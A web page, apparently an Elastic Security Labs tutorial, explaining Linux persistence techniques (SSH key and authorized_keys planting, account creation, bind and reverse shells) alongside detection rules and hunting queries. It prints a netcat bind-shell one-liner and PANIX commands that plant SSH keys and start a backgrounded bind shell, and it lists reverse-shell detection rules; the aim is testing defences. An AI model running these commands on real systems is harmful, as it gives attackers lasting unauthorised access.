<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th>Category</th><th>Coverage</th></tr></thead><tbody><tr><td>File</td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml">Potential Persistence via File Modification</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_user_password_change.toml">Shadow File Modification</a></td></tr><tr><td>Process</td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_linux_backdoor_user_creation.toml">Potential Linux Backdoor User Account Creation</a></td></tr><tr><td>IAM</td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_linux_group_creation.toml">Linux Group Creation</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_linux_user_added_to_privileged_group.toml">Linux User Added to Privileged Group</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_linux_user_account_creation.toml">Linux User Account Creation</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_user_or_group_creation_or_modification.toml">User or Group Creation/Modification</a></td></tr></tbody></table></div>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="hunting-for-t1098t1136---account-manipulationcreation" class="absolute -top-32"></span>Hunting for T1098/T1136 - account manipulation/creation</h3>
<p>There are many ways to hunt for these techniques. The above detection rules can be added as a timelines query to look back at a longer duration of time, the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/var/log/auth.log</code> (and equivalents on other Linux distributions) can be parsed and read, and OSQuery can be leveraged to read user info from a running system. The <a href="https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_user_group_creation_modification.toml">Privilege Escalation/Persistence via User/Group Creation and/or Modification</a> hunt rule contains several OSQuery queries to hunt for these techniques.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="t1098004---account-manipulation-ssh" class="absolute -top-32"></span>T1098.004 - account manipulation: SSH</h2>
<p><a href="https://linux.die.net/man/1/ssh">Secure Shell (SSH)</a> is a protocol to securely access remote systems. It leverages public/private key pairs to authenticate users, providing a more secure alternative to password-based logins. The SSH keys consist of a private key, kept secure by the user, and a public key, shared with the remote system.</p>
<p>The default locations for user-specific SSH key files and configuration files are as follows:</p>
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.ssh/id_rsa</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.ssh/id_rsa.pub</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.ssh/authorized_keys</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/root/.ssh/id_rsa</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/root/.ssh/id_rsa.pub</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/root/.ssh/authorized_keys</code></li>
</ul>
<p>A system-wide configuration is present in:</p>
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/ssh/</code></li>
</ul>
<p>The private key remains on the client machine, while the public key is copied to the remote server’s <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">authorized_keys</code> file. This setup allows the user to authenticate with the server without entering a password.</p>
<p>SSH keys are used to authenticate remote login sessions via SSH and for services like Secure Copy Protocol (SCP) and Secure File Transfer Protocol (SFTP), which allow secure file transfers between machines.</p>
<p>An attacker can establish persistence on a compromised host by adding their public key to the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">authorized_keys</code> file of a user with sufficient privileges. This ensures they can regain access to the system even if the user changes their password. This persistence method is stealthy as built-in shell commands can be used, which are commonly more difficult to capture as a data source. Additionally, it does not rely on creating new user accounts or modifying system binaries.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="persistence-through-t1098004---ssh-modification" class="absolute -top-32"></span>Persistence through T1098.004 - SSH modification</h3>
<p>Similar to previously, PANIX can be used to establish persistence through SSH. It can also be tested by manually adding a new key to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.ssh/authorized_keys</code>, or by creating a new public/private key pair on the system. If you want to test these techniques, you can execute the following PANIX command to establish persistence by creating a new key:</p>
<pre><code>./panix.sh --ssh-key --default
SSH key generated:
Private key: /home/user/.ssh/id_rsa18220
Public key: /home/user/.ssh/id_rsa1822.pub
[+] SSH key persistence established.</code></pre>
<p>Use the following PANIX command to add a new public key to the authorized_keys file:</p>
<pre><code>./panix.sh  --authorized-keys --default --key &lt;key&gt;
[+] Persistence added to /home/user/.ssh/authorized_keys</code></pre>
<p>For file modification events, we can leverage FIM. We have several detection rules covering this technique in place.</p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th>Category</th><th>Coverage</th></tr></thead><tbody><tr><td>File</td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml">Potential Persistence via File Modification</a></td></tr><tr><td>Process</td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_ssh_key_generation.toml">SSH Key Generated via ssh-keygen</a></td></tr></tbody></table></div>
<p>A note on leveraging the “Potential Persistence via File Modification” rule: due to the limitation of leveraging wildcards in FIM, the FIM configuration should be adapted to represent your environment’s public/private key and authorized_keys file locations. MITRE provides additional information on this technique in <a href="https://attack.mitre.org/techniques/T1098/004/">T1098.004</a>.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="hunting-for-t1098004---ssh-modification" class="absolute -top-32"></span>Hunting for T1098.004 - SSH modification</h3>
<p>The main focuses while hunting for SSH persistence are newly added public/private keys, file changes related to the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">authorized_keys</code> files, and configuration changes. We can leverage OSQuery to hunt for all three through the queries in the <a href="https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_ssh_configurations_and_keys.toml">Persistence via SSH Configurations and/or Keys</a> hunt.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="t1059004---command-and-scripting-interpreter-bind-shells" class="absolute -top-32"></span>T1059.004 - command and scripting interpreter: bind shells</h2>
<p><a href="https://www.geeksforgeeks.org/difference-between-bind-shell-and-reverse-shell/">A bind shell</a> is a remote access tool allowing an attacker to connect to a compromised system. Unlike reverse shells, which connect back to the attacker’s machine, a bind shell listens for incoming connections on the compromised host. This allows the attacker to connect at will, gaining command execution on the target machine.</p>
<p>A bind shell typically involves the following steps:</p>
<ol>
<li>Listening Socket: The compromised system opens a network socket and listens for incoming connections on a specific port.</li>
<li>Binding the Shell: When a connection is established, the system binds a command shell (such as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/bin/bash</code> or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/bin/sh</code>) to the socket.</li>
<li>Remote Access: The attacker connects to the bind shell using a network client (like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">netcat</code>) and gains access to the command shell on the compromised system.</li>
</ol>
<p>An attacker can set up a bind shell in various ways, ranging from simple one-liners to more sophisticated scripts. Here is an example of a bind shell using the traditional version of netcat:</p>
<pre><code>nc -lvnp 9001 -e /bin/bash</code></pre>
<p>Once the bind shell is set up, the attacker can connect to it from their machine:</p>
<pre><code>nc -nv &lt;target_ip&gt; 4444</code></pre>
<p>To maintain persistence, the bind shell must be set to start automatically upon system boot or reboot. This can be achieved through various methods we discussed earlier, such as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">cron</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Systemd,</code> or methods discussed in the next part of this Linux detection engineering series.</p>
<p>MITRE does not have a specific bind/reverse-shell technique, and probably classifies bind shells as the execution technique. However, the bind shell is used for persistence in our use case. Some more information from MITRE on bind/reverse shells is available at <a href="https://attack.mitre.org/techniques/T1059/004/">T1059.004</a>.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="persistence-through-t1059004---bind-shells" class="absolute -top-32"></span>Persistence through T1059.004 - bind shells</h3>
<p>Detecting bind shells through behavioral rules is inherently challenging because their behavior is typically benign and indistinguishable from legitimate processes. A bind shell opens a network socket and waits for an incoming connection, a common activity for many legitimate services. When an attacker connects, it merely results in a network connection and the initiation of a shell session, which are both normal operations on a system.</p>
<p>Due to behavioral detection&#x27;s limitations, the most reliable method for identifying bind shells is static signature detection. This approach involves scanning the file system or memory for known shellcode patterns associated with bind shells.</p>
<p>By leveraging static signatures, we can identify and prevent bind shells more effectively than relying solely on behavioral analysis. This approach helps detect the specific code sequences used by bind shells, regardless of their behavior, ensuring a more robust defense against this type of persistence mechanism.</p>
<p>As all of our signature-based detections are open-source, you can check them out by visiting our <a href="https://github.com/elastic/protections-artifacts/tree/main/yara/rules">protections-artifacts YARA repository</a>. If you want to analyze this method within your tooling, you can leverage PANIX to set up a bind shell and connect to it using <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">nc</code>. To do so, execute the following command:</p>
<pre><code>./panix.sh --bind-shell --default --architecture x64
[+] Bind shell /tmp/bd64 was created, executed and backgrounded.
[+] The bind shell is listening on port 9001.
[+] To interact with it from a different system, use: nc -nv &lt;IP&gt; 9001
[+] Bind shell persistence established!</code></pre>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="hunting-for-t1059004---bind-shells" class="absolute -top-32"></span>Hunting for T1059.004 - bind shells</h3>
<p>Although writing solid behavioral detection rules that do not provide false positives on a regular basis is near impossible, hunting for them is not. Based on the behavior of a bind shell, we know that we can look for long running processes, listening ports and listening sockets. To do so, we can leverage OSQuery. Several hunts are available for this scenario within the <a href="https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_reverse_bind_shells.toml">Persistence Through Reverse/Bind Shells</a> hunting rule.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="t1059004---command-and-scripting-interpreter-reverse-shells" class="absolute -top-32"></span>T1059.004 - command and scripting interpreter: reverse shells</h2>
<p>Reverse shells are utilized in many of the persistence techniques discussed in this article and will be further explored in upcoming parts. While specific rules for detecting reverse shells were not added to many of the techniques above, they are very relevant. To maintain consistency and ensure comprehensive coverage, the following detection and endpoint rules are included to capture these persistence mechanisms.</p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th>Category</th><th>Coverage</th></tr></thead><tbody><tr><td>Process</td><td><a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/execution_suspicious_execution_via_setsid_and_nohup.toml">Suspicious Execution via setsid and nohup</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/execution_suspicious_execution_via_a_hidden_process.toml">Suspicious Execution via a Hidden Process</a></td></tr><tr><td>Network</td><td><a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/execution_linux_reverse_shell.toml">Linux Reverse Shell</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/execution_linux_reverse_shell_via_child.toml">Linux Reverse Shell via Child</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/execution_linux_reverse_shell_via_netcat.toml">Linux Reverse Shell via Netcat</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/execution_linux_reverse_shell_via_suspicious_utility.toml">Linux Reverse Shell via Suspicious Utility</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/execution_linux_reverse_shell_via_setsid_and_nohup.toml">Linux Reverse Shell via setsid and nohup</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/execution_shell_via_meterpreter_linux.toml">Potential Meterpreter Reverse Shell</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/execution_shell_via_udp_cli_utility_linux.toml">Potential Reverse Shell via UDP</a></td></tr></tbody></table></div>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="conclusion" class="absolute -top-32"></span>Conclusion</h2>
<p>In this part of the “Linux Detection Engineering” series, we looked into the basics of Linux persistence. If you missed the first part of the series, which focused on detection engineering with Auditd, you can catch up <a href="https://www.elastic.co/security-labs/linux-detection-engineering-with-auditd">here</a>. This article explored various persistence techniques, including scheduled tasks, systemd services, shell profile modifications, XDG autostart configurations, SUID/SGID binaries, sudoers rules, user and group creations/modifications, SSH key, and authorized_key modifications, bind and reverse shells.</p>
<p>Not only did the explanation cover how each persistence method operates, but it also provided practical demonstrations of configuring them using a straightforward tool called <a href="https://github.com/Aegrah/PANIX">PANIX</a>. This hands-on approach enabled you to test the coverage of these techniques using your preferred security product. Additionally, we discussed hunting strategies for each method, ranging from ES|QL aggregation queries to live hunt queries with OSQuery.</p>
<p>We hope you found this format helpful. In the next article, we&#x27;ll explore more advanced and lesser-known persistence methods used in the wild. Until then, happy hunting!</p></div></div></div><div class="hidden lg:flex lg:col-span-1 text-sm lg:flex-col lg:space-y-6"><div class="toc"><h4 class="font-bold leading-tight text-lg md:text-2xl mb-3">Jump to section</h4><ul class="flex flex-col space-y-2"><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/primer-on-persistence-mechanisms#introduction"><span>Introduction</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/primer-on-persistence-mechanisms#what-is-persistence"><span>What is&nbsp;persistence?</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/primer-on-persistence-mechanisms#setup"><span>Setup</span></a></li><li><a class="flex items-center space-x-1 hover:text-white" href="/security-labs/primer-on-persistence-mechanisms#t1053---scheduled-taskjob"><span>T1053 -&nbsp; scheduled&nbsp;task/job</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/primer-on-persistence-mechanisms#t1053003---scheduled-taskjob-cron"><span>T1053.003 -&nbsp; scheduled task/job:&nbsp;Cron</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-8" href="/security-labs/primer-on-persistence-mechanisms#persistence-through-t1053003---cron"><span>Persistence through T1053.003 -&nbsp;&nbsp;cron</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/primer-on-persistence-mechanisms#t1053002---scheduled-taskjob-at"><span>T1053.002 -&nbsp; scheduled task/job:&nbsp;at</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-8" href="/security-labs/primer-on-persistence-mechanisms#persistence-through-t1053002---at"><span>Persistence through T1053.002 -&nbsp;&nbsp;At</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/primer-on-persistence-mechanisms#t1053---scheduled-taskjob-honorable-mentions"><span>T1053 -&nbsp; scheduled task/job: honorable&nbsp;mentions</span></a></li><li><a class="flex items-center space-x-1 hover:text-white ml-4" href="/security-labs/primer-on-persistence-mechanisms#hunting-for-t1053---scheduled-taskjob-"><span>Hunting for T1053 -&nbsp; scheduled task/job&nbsp;</span></a></li></ul><button class="border-t border-white/20 w-full mt-3 py-2 flex items-center space-x-1 text-xs font-medium uppercase tracking-wide hover:text-white"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="w-3 h-3"><path d="M10.75 4.75a.75.75 0 00-1.5 0v4.5h-4.5a.75.75 0 000 1.5h4.5v4.5a.75.75 0 001.5 0v-4.5h4.5a.75.75 0 000-1.5h-4.5v-4.5z"></path></svg><span>Show more</span></button></div><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 md:p-2 sm:p-4 md:px-6 md:py-4 rounded-xl"><h4 class="font-bold leading-tight text-lg md:text-2xl mb-3">Elastic Security Labs Newsletter</h4><div><a target="_blank" class="button inline-flex" href="https://www.elastic.co/security-labs/newsletter?utm_source=security-labs">Sign Up</a></div></div></div></div><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 md:p-2 sm:p-4 md:px-6 md:py-4 rounded-xl my-5 md:my-10 max-w-3xl mx-auto flex flex-col items-center shadow-2xl"><h4 class="font-bold leading-tight text-lg md:text-2xl">Share this article</h4><div class="flex flex-wrap items-center justify-center mt-4 space-x-4"><a class="flex items-center space-x-2 button" href="https://twitter.com/intent/tweet?text=Linux Detection Engineering - A primer on persistence mechanisms&amp;url=https://www.elastic.co/security-labs/primer-on-persistence-mechanisms" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Twitter" title="Share this article on Twitter"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M23.954 4.569c-.885.389-1.83.653-2.825.772a4.98 4.98 0 002.187-2.746 9.955 9.955 0 01-3.157 1.204 4.98 4.98 0 00-8.49 4.54A14.128 14.128 0 011.69 3.05a4.98 4.98 0 001.54 6.638A4.94 4.94 0 011.2 8.62v.06a4.98 4.98 0 004 4.87 4.94 4.94 0 01-2.24.086 4.98 4.98 0 004.64 3.45A9.97 9.97 0 010 20.35a14.075 14.075 0 007.59 2.22c9.16 0 14.17-7.583 14.17-14.17 0-.217-.005-.434-.015-.65a10.128 10.128 0 002.485-2.58l-.001-.001z"></path></svg><span>Twitter</span></a><a class="flex items-center space-x-2 button" href="https://www.facebook.com/sharer/sharer.php?u=https://www.elastic.co/security-labs/primer-on-persistence-mechanisms" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Facebook" title="Share this article on Facebook"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M22.5 12c0-5.799-4.701-10.5-10.5-10.5S1.5 6.201 1.5 12c0 5.301 3.901 9.699 9 10.401V14.4h-2.7v-2.7h2.7v-2.1c0-2.7 1.8-4.2 4.2-4.2 1.2 0 2.1.1 2.4.2v2.4h-1.5c-1.2 0-1.5.6-1.5 1.5v1.8h3l-.3 2.7h-2.7V22C18.599 21.3 22.5 17.301 22.5 12z"></path></svg><span>Facebook</span></a><a class="flex items-center space-x-2 button" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://www.elastic.co/security-labs/primer-on-persistence-mechanisms&amp;title=Linux Detection Engineering - A primer on persistence mechanisms" target="_blank" rel="noopener noreferrer" aria-label="Share this article on LinkedIn" title="Share this article on LinkedIn"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill="currentColor" d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"></path></svg><span>LinkedIn</span></a><a class="flex items-center space-x-2 button" href="https://reddit.com/submit?url=https://www.elastic.co/security-labs/primer-on-persistence-mechanisms&amp;title=Linux Detection Engineering - A primer on persistence mechanisms" target="_blank" rel="noopener noreferrer" aria-label="Share this article on Reddit" title="Share this article on Reddit"><svg class="w-4 h-4" viewBox="0 0 24 24"><path fill-rule="evenodd" clip-rule="evenodd" d="M24 12C24 18.6274 18.6274 24 12 24C5.37258 24 0 18.6274 0 12C0 5.37258 5.37258 0 12 0C18.6274 0 24 5.37258 24 12ZM19.6879 11.0584C19.8819 11.3352 19.9916 11.6622 20.004 12C20.0091 12.3306 19.9205 12.656 19.7485 12.9384C19.5765 13.2208 19.3281 13.4488 19.032 13.596C19.0455 13.7717 19.0455 13.9483 19.032 14.124C19.032 16.812 15.9 18.996 12.036 18.996C8.172 18.996 5.04 16.812 5.04 14.124C5.02649 13.9483 5.02649 13.7717 5.04 13.596C4.80919 13.49 4.6042 13.335 4.43923 13.1419C4.27427 12.9487 4.15327 12.722 4.08462 12.4775C4.01598 12.2329 4.00133 11.9764 4.04169 11.7256C4.08205 11.4748 4.17646 11.2358 4.31837 11.0251C4.46028 10.8145 4.6463 10.6372 4.86354 10.5056C5.08078 10.3739 5.32404 10.2911 5.57646 10.2629C5.82889 10.2346 6.08444 10.2616 6.32541 10.3419C6.56638 10.4222 6.78701 10.5539 6.972 10.728C8.35473 9.79023 9.98146 9.27718 11.652 9.252L12.54 5.088C12.55 5.03979 12.5694 4.99405 12.5972 4.95341C12.625 4.91277 12.6605 4.87805 12.7018 4.85127C12.7431 4.82448 12.7894 4.80615 12.8378 4.79735C12.8862 4.78855 12.9359 4.78945 12.984 4.8L15.924 5.388C16.0676 5.14132 16.2944 4.9539 16.5637 4.85937C16.833 4.76484 17.1272 4.7694 17.3934 4.87222C17.6597 4.97505 17.8806 5.1694 18.0164 5.42041C18.1523 5.67141 18.1942 5.96262 18.1348 6.24177C18.0753 6.52092 17.9182 6.76972 17.6918 6.94352C17.4654 7.11732 17.1845 7.20473 16.8995 7.19006C16.6144 7.1754 16.3439 7.05962 16.1366 6.8635C15.9292 6.66738 15.7985 6.40378 15.768 6.12L13.2 5.58L12.42 9.324C14.0702 9.3594 15.6749 9.87206 17.04 10.8C17.2839 10.566 17.5902 10.4074 17.9221 10.3436C18.254 10.2797 18.5973 10.3132 18.9106 10.4401C19.2239 10.5669 19.4939 10.7817 19.6879 11.0584ZM8.20624 12.5333C8.07438 12.7307 8.004 12.9627 8.004 13.2C8.004 13.5183 8.13043 13.8235 8.35547 14.0485C8.58051 14.2736 8.88574 14.4 9.204 14.4C9.44134 14.4 9.67335 14.3296 9.87068 14.1978C10.068 14.0659 10.2218 13.8785 10.3127 13.6592C10.4035 13.4399 10.4272 13.1987 10.3809 12.9659C10.3346 12.7331 10.2204 12.5193 10.0525 12.3515C9.8847 12.1836 9.67089 12.0694 9.43811 12.0231C9.20533 11.9768 8.96405 12.0005 8.74478 12.0913C8.52551 12.1822 8.33809 12.336 8.20624 12.5333ZM12.012 17.424C13.0771 17.4681 14.1246 17.1416 14.976 16.5V16.548C15.0075 16.5173 15.0327 16.4806 15.05 16.4402C15.0674 16.3997 15.0766 16.3563 15.0772 16.3122C15.0777 16.2682 15.0696 16.2245 15.0533 16.1837C15.0369 16.1428 15.0127 16.1055 14.982 16.074C14.9513 16.0425 14.9146 16.0173 14.8742 16C14.8337 15.9826 14.7903 15.9734 14.7462 15.9728C14.7022 15.9723 14.6585 15.9804 14.6177 15.9967C14.5768 16.0131 14.5395 16.0373 14.508 16.068C13.7797 16.5904 12.895 16.8487 12 16.8C11.1061 16.8399 10.2255 16.5732 9.504 16.044C9.44182 15.993 9.36289 15.9669 9.28256 15.9708C9.20222 15.9748 9.12622 16.0085 9.06935 16.0653C9.01247 16.1222 8.97879 16.1982 8.97484 16.2786C8.97089 16.3589 8.99697 16.4378 9.048 16.5C9.89937 17.1416 10.9469 17.4681 12.012 17.424ZM14.0933 14.2458C14.2907 14.3776 14.5227 14.448 14.76 14.448L14.748 14.496C14.9107 14.4978 15.0721 14.4664 15.2223 14.4038C15.3725 14.3413 15.5084 14.2488 15.6218 14.1321C15.7352 14.0154 15.8236 13.8768 15.8818 13.7248C15.9399 13.5728 15.9665 13.4106 15.96 13.248C15.96 13.0107 15.8896 12.7787 15.7578 12.5813C15.6259 12.384 15.4385 12.2302 15.2192 12.1393C14.9999 12.0485 14.7587 12.0248 14.5259 12.0711C14.2931 12.1174 14.0793 12.2316 13.9115 12.3995C13.7436 12.5673 13.6294 12.7811 13.5831 13.0139C13.5368 13.2467 13.5605 13.4879 13.6513 13.7072C13.7422 13.9265 13.896 14.1139 14.0933 14.2458Z" fill="currentColor"></path></svg><span>Reddit</span></a></div></div></article></main><footer class="mt-auto text-xs md:text-sm"><div class="container py-6 flex flex-col md:flex-row gap-2 md:gap-0 justify-between items-center"><div class="text-zinc-300"><nav><ul class="flex space-x-4"><li><a class="hover:text-white font-medium" href="/security-labs/sitemap.xml">Sitemap</a></li><li><a class="hover:text-white font-medium flex items-center space-x-1" href="https://elastic.co?utm_source=elastic-search-labs&amp;utm_medium=referral&amp;utm_campaign=search-labs&amp;utm_content=footer"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="inline-block w-3 h-3"><path stroke-linecap="round" stroke-linejoin="round" d="M13.5 6H5.25A2.25 2.25 0 003 8.25v10.5A2.25 2.25 0 005.25 21h10.5A2.25 2.25 0 0018 18.75V10.5m-10.5 6L21 3m0 0h-5.25M21 3v5.25"></path></svg><span>Elastic.co</span></a></li><li><a class="hover:text-white font-medium flex items-center space-x-1" href="https://twitter.com/elasticseclabs"><svg class="w-4 h-4 inline-block w-3 h-3" viewBox="0 0 24 24"><path fill="currentColor" d="M23.954 4.569c-.885.389-1.83.653-2.825.772a4.98 4.98 0 002.187-2.746 9.955 9.955 0 01-3.157 1.204 4.98 4.98 0 00-8.49 4.54A14.128 14.128 0 011.69 3.05a4.98 4.98 0 001.54 6.638A4.94 4.94 0 011.2 8.62v.06a4.98 4.98 0 004 4.87 4.94 4.94 0 01-2.24.086 4.98 4.98 0 004.64 3.45A9.97 9.97 0 010 20.35a14.075 14.075 0 007.59 2.22c9.16 0 14.17-7.583 14.17-14.17 0-.217-.005-.434-.015-.65a10.128 10.128 0 002.485-2.58l-.001-.001z"></path></svg><span>@elasticseclabs</span></a></li></ul></nav></div><div class="flex flex-col space-y-1 text-zinc-300"><p>© <!-- -->2024<!-- -->. Elasticsearch B.V. All Rights Reserved.</p></div></div></footer></main></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"article":{"title":"Linux Detection Engineering - A primer on persistence mechanisms","slug":"primer-on-persistence-mechanisms","date":"2024-08-21","description":"In this second part of the Linux Detection Engineering series, we map multiple Linux persistence mechanisms to the MITRE ATT\u0026CK framework, explain how they work, and how to detect them.","image":"primer-on-persistence-mechanisms.jpg","subtitle":"A walkthrough on how threat actors establish persistence on Linux systems and how to hunt for these techniques.","tags":["linux","persistence"],"body":{"raw":"\n## Introduction\n\nIn this second part of the Linux Detection Engineering series, we'll examine Linux persistence mechanisms in detail, starting with common or straightforward methods and moving toward more complex or obscure techniques. The goal is to educate defenders and security researchers on the foundational aspects of Linux persistence techniques by examining both trivial and more complicated methods, understanding how these methods work, how to hunt for them, and how to develop effective detection strategies.\n\nFor those who missed the first part, \"Linux Detection Engineering with Auditd\", it can be found [here](https://www.elastic.co/security-labs/linux-detection-engineering-with-auditd).\n\nFor this installment, we'll set up the persistence mechanisms, analyze the logs, and observe the potential detection opportunities. To aid in this process, we’re sharing [PANIX](https://github.com/Aegrah/PANIX), a Linux persistence tool developed by Ruben Groenewoud of Elastic Security. PANIX simplifies and customizes persistence setup to test your detections.\n\nBy the end of this article, you'll have a solid understanding of each persistence mechanism we describe, including:\n* How it works (theory)\n* How to set it up (practice)\n* How to detect it (SIEM and Endpoint rules)\n* How to hunt for it (ES|QL and OSQuery hunts)\n\nStep into the world of Linux persistence with us, it’s fun!\n\n## What is persistence?\n\nLet’s start with the basics. [Persistence](https://attack.mitre.org/tactics/TA0003/) refers to an attacker's ability to maintain a foothold in a compromised system or network even after reboots, password changes, or other attempts to remove them.\n\nPersistence is crucial for attackers, ensuring extended access to the target environment. This enables them to gather intelligence, understand the environment, move laterally through the network, and work towards achieving their objectives.\n\nGiven that most malware attempts to establish some form of persistence automatically, this phase is critical for defenders to understand. Ideally, attacks should be detected and prevented during initial access, but this is not always possible. Many malware samples also leverage multiple persistence techniques to ensure continued access. Notably, these persistence mechanisms can often be detected with robust defenses in place.\n\nEven if an attack is detected, the initial access vector is patched and mitigated, but any leftover persistence mechanism can allow the attackers to regain access and resume their operations. Therefore, it's essential to monitor the establishment of some persistence mechanisms close to real time and hunt others regularly.\n\nTo support this effort, Elastic utilizes the MITRE ATT\u0026CK framework as the primary lexicon for categorizing techniques in most of our detection artifacts. [MITRE ATT\u0026CK](https://attack.mitre.org/matrices/enterprise/) is a globally accessible knowledge base of adversary tactics and techniques based on real-world observations. It is commonly used as a foundation for developing specific threat models and methodologies within the field of cybersecurity. By leveraging this comprehensive framework, we enhance our ability to detect, understand, and mitigate persistent threats effectively.\n\n## Setup\n\nTo ensure you are prepared to detect the persistence mechanisms discussed in this article, [enabling and updating our pre-built detection rules is important](https://www.elastic.co/guide/en/security/current/prebuilt-rules-management.html#update-prebuilt-rules). If you are working with a custom-built ruleset and do not use all of our pre-built 